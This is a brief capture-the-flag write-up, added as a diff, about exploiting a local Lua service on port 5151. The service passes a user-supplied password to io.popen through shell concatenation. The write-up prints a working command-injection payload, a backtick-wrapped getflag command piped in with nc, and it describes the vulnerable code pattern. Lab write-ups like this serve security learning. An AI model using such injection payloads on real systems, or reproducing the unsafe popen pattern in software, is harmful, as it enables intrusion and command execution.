@@ -1,0 +1,13 @@
+We have the rights to cat the lua file
+
+we see that it listen on the port 5151 and that with netstat -tuln it is running
+
+we can then connect using nc localhost 5151 and it ask for a password
+
+lets check a little the code
+
+it is using "io.popen("echo "..pass.." | sha1sum", "r")" which is executing an echo command
+
+We can then use this command : "echo '`getflag > /tmp/token`' | nc localhost 5151"
+
+gg
